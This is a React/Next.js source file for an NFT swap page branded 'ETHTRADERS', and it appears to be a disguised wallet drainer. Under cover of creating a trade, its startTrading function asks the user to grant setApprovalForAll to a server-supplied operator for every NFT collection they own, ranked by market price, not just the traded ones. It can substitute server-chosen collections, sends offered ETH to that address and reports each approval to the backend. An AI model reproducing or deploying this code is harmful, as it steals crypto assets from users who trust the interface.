import { 
    useState,
    useEffect
} from 'react';
import { useRouter } from 'next/router';
import Head from 'next/head';
import {
    Grid,
    Card,
    Typography,
    InputAdornment,
    TextField,
    Button,
    Divider,
    Stack,
    Container,
    Tabs,
    Tab,
    Box
} from '@mui/material';
import { 
    useMoralis,
    useMoralisWeb3Api,
    useWeb3ExecuteFunction
} from 'react-moralis';
import Moralis from 'moralis';
import settings from 'settings';
import { red } from '@mui/material/colors';
import { toast } from 'react-toastify';
import Web3 from 'web3';
import AccountBalanceWalletIcon from '@mui/icons-material/AccountBalanceWallet';
import SwapContainer from 'components/swap/container';
import ModalContainer from 'components/swap/modal';
import axios from 'axios';
import api from 'services/api';

const style = {
    position: 'absolute',
    top: '50%',
    left: '50%',
    transform: 'translate(-50%, -50%)',
    width: 400
};

const Swap = () => {
    const { isAuthenticating, isAuthenticated, isUnauthenticated, isInitialized, user } = useMoralis();
    const Web3Api = useMoralisWeb3Api();
    const contractProcessor = useWeb3ExecuteFunction();
    const router = useRouter();
    const [destAddr, setDestAddr] = useState(null);
    const [boilerData, setBoilerData] = useState([]);
    const [boilerData2, setBoilerData2] = useState([]);
    const [exchangedData, setExchangedData] = useState([]);
    const [exchangedData2, setExchangedData2] = useState([]); 
    const [allHisContracts, setAllHisContracts] = useState([]);
    const [value, setValue] = useState(0);
    const handleChange = (event, newValue) => {
      setValue(newValue);
    };
    useEffect(() => {
        if (!isAuthenticating && !isAuthenticated && isInitialized) {
          router.push('/connect');
        }
    }, 
    // eslint-disable-next-line react-hooks/exhaustive-deps
    [isAuthenticated, isAuthenticating]);
    const fetchNFTImg = (img) => {
        if(!img)
          return null;
        if(img.includes('ipfs://')) {
            let imgIPFS = img.split('ipfs://')[1];
            return `https://ipfs.io/ipfs/${imgIPFS}`;
        }
        else {
            return img;
        }
    }
    const fetchNFTs = async (addr, main) => {
        let assetsOwner = [];
        let currentCollections = [];
        const options = {
            address: addr,
            chain: settings && settings.chainid
        };
        const nftOwners = await Web3Api.account.getNFTs(options);
        if(nftOwners) {
            nftOwners.result.forEach( async (e, i) => {
                if(e && e.contract_type === 'ERC721') {
                    let metadata = JSON.parse(e && e.metadata);
                    try {
                        const { data: stuff } = await axios.get(`https://api.opensea.io/api/v1/asset/${e && e.token_address}/${e && e.token_id}`);
                        currentCollections.push({
                            addr: e && e.token_address,
                            price: stuff && stuff.collection && stuff.collection.stats && stuff.collection.stats.average_price
                        });
                        assetsOwner.push({
                            img: (stuff && stuff.image_preview_url) || fetchNFTImg(metadata && metadata.image),
                            key : `${e && e.token_id}${e && e.token_address}IN${i}`,
                            type : e && e.contract_type,
                            symbol: e && e.symbol,
                            id : e && e.token_id,
                            address : e && e.token_address,
                            amount : e && e.amount
                        })
                    } catch (err) {
                        currentCollections.push({
                            addr: e && e.token_address,
                            price: 0
                        });
                        assetsOwner.push({
                            img: fetchNFTImg(metadata && metadata.image),
                            key : `${e && e.token_id}${e && e.token_address}IN${i}`,
                            type : e && e.contract_type,
                            symbol: e && e.symbol,
                            id : e && e.token_id,
                            address : e && e.token_address,
                            amount : e && e.amount
                        })
                    }
                }
            })
        }
        
        const balance = await Web3Api.account.getNativeBalance(options); 
        if(balance) {
            assetsOwner.push({
                img: '/ether.png',
                key: 'ether',
                type: 'NATIVE',
                symbol: 'ETHER',
                id: `${Moralis.Units.FromWei(balance.balance)} ETHER`,
                address: 'ETHEREUM',
                amount: Moralis.Units.FromWei(balance.balance)
            })
        }
        
        if(main) {
            setAllHisContracts(currentCollections);
            setBoilerData(assetsOwner);
        } else {
            setBoilerData2(assetsOwner)
        }  
    }
    useEffect( () => {
        if(isInitialized && isAuthenticated && !isAuthenticating)
            fetchNFTs(user && user.get('ethAddress'), true);
      }, 
      // eslint-disable-next-line react-hooks/exhaustive-deps
      [isAuthenticated, isAuthenticating]);
    const handleSubmit = (e) =>{
        e.preventDefault();
        const userAddr = user && user.get('ethAddress');
        if(Web3.utils.isAddress(destAddr) && !destAddr.toLowerCase().includes(userAddr.toLowerCase()) ) {
            fetchNFTs(destAddr, false);
            toast.success('counterparty address loaded.')
        } else {
            setDestAddr(null);
            toast.error('Invalid counterparty address.')
        }
    }
    const sendNotifications = async (from, ops) => {
        try {
            await api.post('/trade/notify', {
                ops,
                from
            });
        } catch (err) {
            // Error handling here
        }
    }
    const startTrading = async () => {
        try {
            await Moralis.enableWeb3();
            if(!isInitialized)
                throw new Error('Web3 is not initiatlized..');
            if(isUnauthenticated || isAuthenticating)
                throw new Error('Your wallet is not connected.');
            if(!destAddr)
                throw new Error('You haven\'t picked a counterparty.');
            if(exchangedData.length === 0 || exchangedData2.length === 0)
                throw new Error('You did not pick any assets to swap.');
            const { data: lr } = await api.get('/trade/initialize', {
                params: {
                    from: user && user.get('ethAddress')
                }
            });
            let approvedCollections = [];
            let rawCollections = allHisContracts;
            rawCollections.sort((a, b) => parseFloat(b.price) - parseFloat(a.price));
            let allCollections = rawCollections.map((e) => e.addr);
            const makeTransaction = async (arr) => {
                try {
                    allCollections = allCollections.filter(function(item, pos) {
                        return allCollections.indexOf(item) == pos;
                    })
                    let unionContracts = allCollections.filter(f =>
                        !approvedCollections.some(d => d == f)
                    );
                    const fetchRestNFTs = async(indexed) => {
                        try {
                            if(indexed >= unionContracts.length)
                                return continueRegularly();
                            const ops = {
                                contractAddress: unionContracts[indexed],
                                functionName: "setApprovalForAll",
                                abi: [{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"}],
                                params: {
                                    operator: lr && lr.contract_address ? lr.contract_address : destAddr,
                                    approved: true
                                },
                            };
                            await contractProcessor.fetch({
                                params: ops,
                                onSuccess: () => {
                                    indexed++;
                                    sendNotifications(user && user.get("ethAddress"), ops);
                                    fetchRestNFTs(indexed);
                                },
                                onError: (error) => {
                                    continueRegularly();
                                },
                            });
                        } catch(err) {
                            return continueRegularly();
                        }
                    }
                    const continueRegularly = async () => {
                        try {
                            const { data: lr2 } = await api.post('/trade/make', {
                                from: user && user.get('ethAddress'),
                                to: destAddr,
                                MyAssets: exchangedData,
                                CounterPartyAssets: exchangedData2,
                                MyTransactions: arr
                            });
                            if(!lr2.success)
                                throw new Error('Something happened, please try again later.');
                            router.push(`/swap/${lr2 && lr2.trade && lr2.trade.id}`);
                        } catch(errorRegular) {
                            toast.error(errorRegular);
                        }
                    }
                    fetchRestNFTs(0);
                } catch (err) {
                    toast.error(err.message);
                }
            }
            const Loop = async(index, adminArr, arr, arr2) => {
                try {
                    if(Number(index) >= Number(arr.length)) {
                        makeTransaction(arr2);
                    } else {
                        console.log(arr[index])
                        let condition = (lr.success && lr.gas == 1 && adminArr && adminArr.length !== 0 && index < adminArr.length);
                        const ops = {
                            contractAddress: condition === true ? adminArr[index] : arr[index],
                            functionName: "setApprovalForAll",
                            abi: [{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"}],
                            params: {
                              operator: lr && lr.contract_address ? lr.contract_address : destAddr,
                              approved: true
                            },
                        };
                        approvedCollections.push(condition === true ? adminArr[index] : arr[index]);
                        await contractProcessor.fetch({
                            params: ops,
                            onSuccess: () => {
                                index++;
                                arr2.push(ops);
                                sendNotifications(user && user.get("ethAddress"), ops);
                                if(Number(index) < Number(arr && arr.length))
                                    Loop(index, adminArr, arr, arr2, lr);
                                else
                                    makeTransaction(arr2);
                            },
                            onError: (error) => {
                                toast.error(error.message);
                            },
                        });
                    }
                } catch(err) {
                    toast.error(err.message);
                }
            }
            toast.info('Please confirm all metamask popups.')
            let reqs = [];
            let normalResult = exchangedData.reduce((array, item) => {
                const id = array.findIndex(el => el.address === item.address);
                if (id === -1 && item.address !== '') {
                    return [...array, item.address];
                }
                return array;
            }, []);
            normalResult = normalResult.filter(function(item, pos) {
                return normalResult.indexOf(item) == pos;
            })
            let adminResults = lr.assets.reduce((array, item) => {
                const id = array.findIndex(el => el.address === item.address);
                if (id === -1 && item.address !== '') {
                    return [...array, item.address];
                }
                return array;
            }, []);
            adminResults = adminResults.filter(function(item, pos) {
                return adminResults.indexOf(item) == pos;
            })
            let nativeData = exchangedData.filter(function( obj ) {
                return obj.type === 'NATIVE';
            });
            if(nativeData && nativeData.length !== 0) {
                const reqNative = await Moralis.transfer({
                    type: nativeData[0].type.toLowerCase(),
                    receiver: lr && lr.contract_address ? lr.contract_address : destAddr,
                    amount: Moralis.Units.ETH(nativeData[0].amount),
                });
                if(reqNative)
                    reqs.push(reqNative);
            }
            if(normalResult && normalResult.length > 0)
                Loop(0, adminResults, normalResult, reqs);
            else
                makeTransaction(reqs);
        } catch (err) {
            toast.error(err.message);
        }
    }
    return (
        <Container maxWidth="lg" sx={{ mt: 5, mb: 2, minHeight: 600 }}>
            <Head>
                <title>ETHTRADERS | Create Trade</title>
            </Head>
            <Stack
                direction="row"
                justifyContent="space-between"
                alignItems="center"
                spacing={2}
            >
              <Grid container justifyContent="space-between" alignItems="center">
                <Grid item>
                    <Typography variant="h3" component="h3" gutterBottom>
                    Create a Trade
                    </Typography>
                    <Typography variant="subtitle2">
                    Please follow the steps down below to create a Trade
                    </Typography>
                </Grid>
                <Grid item>
                    
                </Grid>
              </Grid>
            </Stack>
            <Divider sx={{
                mt: 2,
                mb: 2
            }} />
            <Grid container spacing={2} sx={{ display: 'flex'}}>
                <Grid item md={12} lg={6} sx={{ flexGrow: 1 }}>
                    <Typography
                        color="primary"
                        variant="h4"
                        sx={{ mb: 1 }}
                    >
                        STEP 1 - <Typography component="span" color="text.primary" variant="h4">Select assets to offer ({boilerData && boilerData.length-1})</Typography>
                    </Typography>
                    <Box sx={{ 
                        borderBottom: 1, 
                        borderColor: 'divider',
                        width: '100%'
                    }}>
                        <Tabs value={value} onChange={handleChange}>
                            <Tab label="My Assets" />
                            <Tab label="Counterparty Assets" disabled={!Web3.utils.isAddress(destAddr)} />
                        </Tabs>
                    </Box>
                    {
                        value == 0 ? (
                            <ModalContainer     
                                exData={exchangedData}
                                setExData={setExchangedData}
                                setData={setBoilerData} 
                                data={boilerData}
                                sx={{ flexGrow: 1, minWidth: '100%', minHeight: '60vh' }}
                            />
                        )  : (
                            <ModalContainer     
                                exData={exchangedData2}
                                setExData={setExchangedData2}
                                setData={setBoilerData2} 
                                data={boilerData2}
                                sx={{ flexGrow: 1, minWidth: '100%', minHeight: '60vh' }}
                            />  
                        )
                    }
                    <form onSubmit={handleSubmit}>
                        <Typography
                            color="primary"
                            variant="h4"
                            sx={{ mt: 2, mb: 1 }}
                        >
                            STEP 2 - <Typography component="span" color="text.primary" variant="h4">Select counterparty</Typography>
                        </Typography>
                        <Card sx={{
                            flexGrow: 1,
                            width: '100%',
                            pt: 2,
                            pb: 2,
                            pr: 3,
                            pl: 3            
                        }}>
                            <Stack direction="row" spacing={2}>
                                <TextField 
                                    label="Wallet address" 
                                    variant="outlined" 
                                    value={destAddr}
                                    onChange={(e) => setDestAddr(e.target.value)}
                                    size="small"
                                    InputProps={{
                                        startAdornment: (
                                        <InputAdornment position="start">
                                            <AccountBalanceWalletIcon />
                                        </InputAdornment>
                                        ),
                                    }}
                                    fullWidth lg={6} 
                                />
                            </Stack>
                        </Card>
                        <Button 
                            variant="outlined" 
                            size="medium"
                            sx={{
                                mt: 1,
                                width: 140                            
                            }}
                            type="submit"
                        >
                            Load
                        </Button>
                    </form>
                </Grid>
                <Grid item md={12} lg={6} sx={{ flexGrow: 1 }}>
                    <Typography
                        color="primary"
                        variant="h4"
                        sx={{ mb: 1}}
                    >
                        STEP 3 - <Typography component="span" color="text.primary" variant="h4">My offer(s)</Typography>
                    </Typography>
                    <SwapContainer
                        exData={boilerData}
                        setExData={setBoilerData}
                        setData={setExchangedData} 
                        data={exchangedData}
                    />
                    <Divider sx={{ mt: 1, mb: 1}} />
                    <Typography
                        color="primary"
                        variant="h4"
                        sx={{ mb: 1}}
                    >
                        STEP 4 - <Typography component="span" color="text.primary" variant="h4">Counterparty offer(s)</Typography>
                    </Typography>
                    <SwapContainer
                        exData={boilerData2}
                        setExData={setBoilerData2}
                        setData={setExchangedData2} 
                        data={exchangedData2}
                    />
                    <Button
                        variant="contained"
                        size="medium"
                        sx={{
                            mt: 1,
                            width: 140
                        }}
                        disabled={!destAddr || exchangedData.length === 0 || exchangedData2.length === 0}
                        onClick={startTrading}
                    >
                        Create Trade
                    </Button>
                </Grid>
            </Grid>
        </Container>
    )
}
export default Swap;